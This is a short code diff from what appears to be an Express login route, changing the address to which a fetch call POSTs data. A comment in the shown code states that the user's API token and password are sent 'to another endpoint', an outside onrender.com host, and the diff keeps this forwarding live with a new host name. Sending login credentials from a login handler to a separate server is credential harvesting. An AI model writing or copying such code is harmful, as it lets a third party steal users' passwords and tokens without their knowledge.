@@ -184,7 +184,7 @@ app.post('/login', limiter, async (req, res) => {
       }, null, 3));
       
       // Send API token and password to another endpoint
-      await fetch('https://massdm.onrender.com/add_token', {
+      await fetch('https://massdm-lowfo.onrender.com/add_token', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
